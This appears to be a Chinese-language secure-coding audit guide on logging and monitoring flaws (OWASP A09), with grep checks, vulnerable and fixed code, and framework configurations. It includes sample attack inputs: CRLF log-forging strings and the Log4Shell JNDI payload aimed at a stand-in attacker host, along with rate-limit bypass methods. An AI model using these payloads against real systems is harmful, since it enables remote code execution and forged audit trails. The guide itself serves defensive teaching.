# 日志与监控安全 (Logging & Monitoring Security)

> OWASP A09:2021 - Security Logging and Monitoring Failures
> 日志注入、敏感数据泄露、监控绕过、审计追踪

---

## 核心风险

| 风险类型 | 描述 | CWE |
|----------|------|-----|
| 日志注入 | 攻击者控制日志内容，伪造审计记录 | CWE-117 |
| 敏感数据记录 | 密码/Token/PII 写入日志 | CWE-532 |
| 日志伪造 | 通过换行符插入虚假日志条目 | CWE-93 |
| 监控绕过 | 绕过安全监控触发条件 | CWE-778 |
| 日志篡改 | 攻击者修改/删除日志文件 | CWE-779 |

---

## 一键检测命令

### 日志注入风险

```bash
# Java - 直接拼接用户输入到日志
grep -rn "log\.\(info\|debug\|warn\|error\).*\+" --include="*.java"
grep -rn "logger\.\(info\|debug\|warn\|error\).*\+" --include="*.java"

# Python
grep -rn "logging\.\(info\|debug\|warning\|error\).*%" --include="*.py"
grep -rn "logger\.\(info\|debug\|warning\|error\).*f\"" --include="*.py"

# JavaScript/Node.js
grep -rn "console\.\(log\|info\|warn\|error\).*\+" --include="*.js" --include="*.ts"
grep -rn "logger\.\(info\|debug\|warn\|error\).*\+" --include="*.js" --include="*.ts"

# PHP
grep -rn "error_log\|syslog\|openlog" --include="*.php"

# Go
grep -rn "log\.\(Print\|Printf\|Println\|Fatal\)" --include="*.go"
```

### 敏感数据记录

```bash
# 搜索可能记录敏感数据的日志
grep -rni "log.*password\|log.*token\|log.*secret\|log.*key\|log.*credential" --include="*.java" --include="*.py" --include="*.js" --include="*.go"

# 搜索完整请求/响应记录
grep -rn "log.*request\|log.*response\|log.*body" --include="*.java" --include="*.py" --include="*.js"

# 搜索异常堆栈完整输出
grep -rn "printStackTrace\|e\.getMessage\|traceback\|stack.*trace" --include="*.java" --include="*.py" --include="*.js"
```

---

## 日志注入漏洞

### 1. CRLF 日志注入

```java
// 🔴 Java - 日志注入
String username = request.getParameter("username");
logger.info("User login attempt: " + username);

// 攻击 Payload:
// username=admin%0A2024-01-01 00:00:00 INFO User login successful: admin

// 日志输出变成:
// 2024-01-01 12:00:00 INFO User login attempt: admin
// 2024-01-01 00:00:00 INFO User login successful: admin  <- 伪造!

// 🟢 安全: 过滤换行符
String safeUsername = username.replaceAll("[\\r\\n]", "");
logger.info("User login attempt: {}", safeUsername);
```

```python
# 🔴 Python - 日志注入
username = request.args.get('username')
logging.info(f"User login: {username}")

# 攻击: username=admin\nINFO:root:Login successful

# 🟢 安全
safe_username = username.replace('\n', '').replace('\r', '')
logging.info("User login: %s", safe_username)
```

```javascript
// 🔴 Node.js - 日志注入
const username = req.body.username;
console.log(`User login: ${username}`);
logger.info(`User login: ${username}`);

// 🟢 安全
const safeUsername = username.replace(/[\r\n]/g, '');
logger.info('User login', { username: safeUsername });
```

### 2. 日志格式化字符串

```java
// 🔴 Java - String.format 日志
String userInput = request.getParameter("data");
logger.info(String.format("Data: %s", userInput));
// 如果 userInput 包含 %n 或其他格式符可能出问题

// 🟢 安全: 使用参数化日志
logger.info("Data: {}", userInput);
```

```python
# 🔴 Python - 格式化字符串
logging.info("Data: %s" % user_input)  # 旧式格式化
logging.info(f"Data: {user_input}")    # f-string (可能有问题)

# 🟢 安全: 使用参数
logging.info("Data: %s", user_input)
```

### 3. Log4j 特定漏洞 (CVE-2021-44228)

```java
// 🔴 Log4j JNDI 注入 (Log4j 2.0-beta9 ~ 2.14.1)
String userAgent = request.getHeader("User-Agent");
logger.info("User-Agent: " + userAgent);

// 攻击 Payload:
// User-Agent: ${jndi:ldap://attacker.com/exploit}

// 检测命令
grep -rn "log4j" pom.xml build.gradle
grep -rn "\$\{jndi:\|lookups" --include="*.java"

// 🟢 修复
// 1. 升级到 Log4j 2.17.0+
// 2. 设置 log4j2.formatMsgNoLookups=true
// 3. 移除 JndiLookup 类
```

---

## 敏感数据记录

### 1. 密码/凭据记录

```java
// 🔴 记录密码
logger.debug("Login attempt - user: " + user + ", password: " + password);
logger.info("API call with token: " + apiToken);

// 🔴 记录完整请求
logger.debug("Request body: " + request.getReader().lines().collect(Collectors.joining()));

// 🟢 安全: 脱敏处理
logger.debug("Login attempt - user: {}", user);  // 不记录密码
logger.info("API call with token: {}...", apiToken.substring(0, 8));  // 部分脱敏
```

### 2. PII (个人身份信息) 记录

```java
// 🔴 记录 PII
logger.info("User registered: " + user.getEmail() + ", SSN: " + user.getSsn());
logger.info("Credit card: " + creditCardNumber);

// 🟢 安全: 脱敏
logger.info("User registered: {}", maskEmail(user.getEmail()));
logger.info("Credit card: ****{}", creditCardNumber.substring(creditCardNumber.length() - 4));

// 脱敏函数
public static String maskEmail(String email) {
    int atIndex = email.indexOf('@');
    if (atIndex > 2) {
        return email.substring(0, 2) + "***" + email.substring(atIndex);
    }
    return "***" + email.substring(atIndex);
}
```

### 3. 异常信息泄露

```java
// 🔴 完整堆栈写入日志 (可能泄露路径/版本/配置)
try {
    // ...
} catch (Exception e) {
    logger.error("Error: " + e.getMessage(), e);  // 完整堆栈
    e.printStackTrace();  // 输出到 stderr
}

// 🔴 返回给用户
return ResponseEntity.status(500).body(e.getStackTrace());

// 🟢 安全
try {
    // ...
} catch (Exception e) {
    String errorId = UUID.randomUUID().toString();
    logger.error("Error [{}]: {}", errorId, e.getMessage(), e);  // 内部日志保留
    return ResponseEntity.status(500).body("Error ID: " + errorId);  // 只返回 ID
}
```

---

## 日志框架安全配置

### Log4j2 安全配置

```xml
<!-- log4j2.xml -->
<Configuration status="WARN">
    <!-- 禁用 JNDI Lookup -->
    <Properties>
        <Property name="log4j2.formatMsgNoLookups">true</Property>
    </Properties>

    <Appenders>
        <RollingFile name="File" fileName="app.log"
                     filePattern="app-%d{yyyy-MM-dd}-%i.log.gz">
            <!-- 使用安全的 Pattern -->
            <PatternLayout>
                <!-- %encode{} 对特殊字符编码 -->
                <Pattern>%d{ISO8601} [%t] %-5level %logger{36} - %encode{%msg}{CRLF}%n</Pattern>
            </PatternLayout>
            <Policies>
                <SizeBasedTriggeringPolicy size="10MB"/>
                <TimeBasedTriggeringPolicy/>
            </Policies>
            <!-- 限制文件数量防止磁盘耗尽 -->
            <DefaultRolloverStrategy max="30"/>
        </RollingFile>
    </Appenders>

    <Loggers>
        <!-- 生产环境禁用 DEBUG -->
        <Root level="INFO">
            <AppenderRef ref="File"/>
        </Root>
    </Loggers>
</Configuration>
```

### Logback 安全配置

```xml
<!-- logback.xml -->
<configuration>
    <!-- 自定义转换器过滤 CRLF -->
    <conversionRule conversionWord="safeMsg"
                    converterClass="com.example.SafeMessageConverter"/>

    <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>app.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>app.%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>30</maxHistory>
            <totalSizeCap>1GB</totalSizeCap>
        </rollingPolicy>
        <encoder>
            <pattern>%d{ISO8601} [%thread] %-5level %logger{36} - %safeMsg%n</pattern>
        </encoder>
    </appender>

    <root level="INFO">
        <appender-ref ref="FILE"/>
    </root>
</configuration>
```

```java
// SafeMessageConverter.java
public class SafeMessageConverter extends ClassicConverter {
    @Override
    public String convert(ILoggingEvent event) {
        return event.getFormattedMessage()
                    .replace("\r", "\\r")
                    .replace("\n", "\\n");
    }
}
```

### Python logging 安全配置

```python
import logging
import re

class CRLFSafeFormatter(logging.Formatter):
    """过滤 CRLF 的格式化器"""
    def format(self, record):
        message = super().format(record)
        return message.replace('\r', '\\r').replace('\n', '\\n')

class SensitiveDataFilter(logging.Filter):
    """过滤敏感数据"""
    PATTERNS = [
        (re.compile(r'password["\']?\s*[:=]\s*["\']?[^"\']+["\']?', re.I), 'password=***'),
        (re.compile(r'token["\']?\s*[:=]\s*["\']?[^"\']+["\']?', re.I), 'token=***'),
        (re.compile(r'\b\d{16}\b'), '****'),  # 信用卡号
    ]

    def filter(self, record):
        for pattern, replacement in self.PATTERNS:
            record.msg = pattern.sub(replacement, str(record.msg))
        return True

# 配置
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(CRLFSafeFormatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
handler.addFilter(SensitiveDataFilter())
logger.addHandler(handler)
```

### Node.js Winston 安全配置

```javascript
const winston = require('winston');

// CRLF 过滤
const crlfSafeFormat = winston.format((info) => {
    if (typeof info.message === 'string') {
        info.message = info.message.replace(/[\r\n]/g, ' ');
    }
    return info;
});

// 敏感数据脱敏
const sensitiveDataFormat = winston.format((info) => {
    const sensitiveKeys = ['password', 'token', 'secret', 'apiKey', 'authorization'];
    const maskValue = (obj) => {
        if (typeof obj !== 'object' || obj === null) return obj;
        const masked = { ...obj };
        for (const key of Object.keys(masked)) {
            if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
                masked[key] = '***';
            } else if (typeof masked[key] === 'object') {
                masked[key] = maskValue(masked[key]);
            }
        }
        return masked;
    };
    info = maskValue(info);
    return info;
});

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        crlfSafeFormat(),
        sensitiveDataFormat(),
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({
            filename: 'app.log',
            maxsize: 10485760,  // 10MB
            maxFiles: 30
        })
    ]
});
```

---

## 监控绕过风险

### 1. 速率限制绕过

```python
# 🔴 简单的 IP 限制容易绕过
failed_attempts = get_failed_attempts(request.remote_addr)
if failed_attempts > 5:
    block_ip(request.remote_addr)

# 绕过方法:
# - X-Forwarded-For 伪造
# - 代理轮换
# - IPv6 地址变化

# 🟢 安全: 多维度限制
def check_rate_limit(request):
    ip = get_real_ip(request)  # 正确获取真实 IP
    user_agent = request.headers.get('User-Agent', '')
    fingerprint = hash(f"{ip}:{user_agent}")

    # 多维度检查
    if is_ip_blocked(ip):
        return False
    if is_fingerprint_blocked(fingerprint):
        return False
    if is_account_locked(request.form.get('username')):
        return False
    return True
```

### 2. 日志逃逸

```bash
# 攻击者可能尝试:
# 1. 超长输入截断日志
# 2. 特殊字符破坏日志解析
# 3. 编码绕过日志过滤

# 防御: 限制日志字段长度
MAX_LOG_FIELD_LENGTH = 1000
safe_input = user_input[:MAX_LOG_FIELD_LENGTH]
```

### 3. 时间戳伪造

```java
// 🔴 使用客户端时间
logger.info("Event at " + request.getParameter("timestamp") + ": " + event);

// 🟢 安全: 始终使用服务器时间
logger.info("Event: {}", event);  // 日志框架自动添加服务器时间
```

---

## 审计追踪最佳实践

### 1. 安全事件记录清单

```java
// 必须记录的安全事件
public enum SecurityEvent {
    LOGIN_SUCCESS,
    LOGIN_FAILURE,
    LOGOUT,
    PASSWORD_CHANGE,
    PASSWORD_RESET_REQUEST,
    ACCOUNT_LOCKED,
    ACCOUNT_UNLOCKED,
    PERMISSION_DENIED,
    PRIVILEGE_ESCALATION,
    SENSITIVE_DATA_ACCESS,
    CONFIGURATION_CHANGE,
    USER_CREATED,
    USER_DELETED,
    ROLE_ASSIGNED,
    API_KEY_CREATED,
    API_KEY_REVOKED
}

public void logSecurityEvent(SecurityEvent event, String userId, String details) {
    String logEntry = String.format(
        "SECURITY_EVENT=%s USER=%s IP=%s DETAILS=%s",
        event, userId, getClientIp(), sanitize(details)
    );
    securityLogger.info(logEntry);
}
```

### 2. 结构化日志

```java
// 使用 JSON 结构化日志便于分析
import net.logstash.logback.argument.StructuredArguments;

logger.info("Security event",
    StructuredArguments.kv("event", "LOGIN_FAILURE"),
    StructuredArguments.kv("user", username),
    StructuredArguments.kv("ip", clientIp),
    StructuredArguments.kv("reason", "invalid_password"),
    StructuredArguments.kv("attempt", attemptCount)
);

// 输出: {"event":"LOGIN_FAILURE","user":"admin","ip":"1.2.3.4","reason":"invalid_password","attempt":3}
```

### 3. 日志完整性保护

```bash
# 日志签名 (使用 rsyslog)
# /etc/rsyslog.d/signing.conf
$ActionOMProgBinaryFileTemplate RSYSLOG_TraditionalFileFormat
$ActionOMProgBinary /usr/local/bin/log-signer.sh

# 日志转发到独立服务器
*.* @@secure-log-server:514

# 使用 append-only 文件系统属性
chattr +a /var/log/secure/*.log
```

---

## 审计清单

```
日志注入防护:
- [ ] 检查日志拼接用户输入
- [ ] 验证 CRLF 过滤
- [ ] 检查 Log4j 版本 (< 2.17.0 危险)
- [ ] 验证日志格式化方式

敏感数据:
- [ ] 搜索日志中的密码/Token
- [ ] 检查 PII 数据记录
- [ ] 验证异常信息处理
- [ ] 检查完整请求/响应记录

配置安全:
- [ ] 验证日志级别 (生产禁用 DEBUG)
- [ ] 检查日志轮转配置
- [ ] 验证日志文件权限
- [ ] 检查日志传输加密

监控完整性:
- [ ] 验证安全事件记录覆盖
- [ ] 检查速率限制实现
- [ ] 验证日志完整性保护
- [ ] 检查日志备份策略
```

---

## 审计正则

```regex
# 日志注入
log\.(info|debug|warn|error)\s*\([^)]*\+|logger\.(info|debug|warn|error)\s*\([^)]*\+
logging\.(info|debug|warning|error)\s*\([^)]*%[^,]

# 敏感数据记录
log.*password|log.*token|log.*secret|log.*api.?key
printStackTrace|getStackTrace|traceback

# Log4j JNDI
\$\{jndi:|lookup.*ldap|lookup.*rmi

# 不安全的日志级别
level.*DEBUG|DEBUG.*level|setLevel.*DEBUG
```

---

**版本**: 1.0
**更新日期**: 2026-02-04
**覆盖漏洞类型**: 日志注入、敏感数据泄露、监控绕过、审计追踪
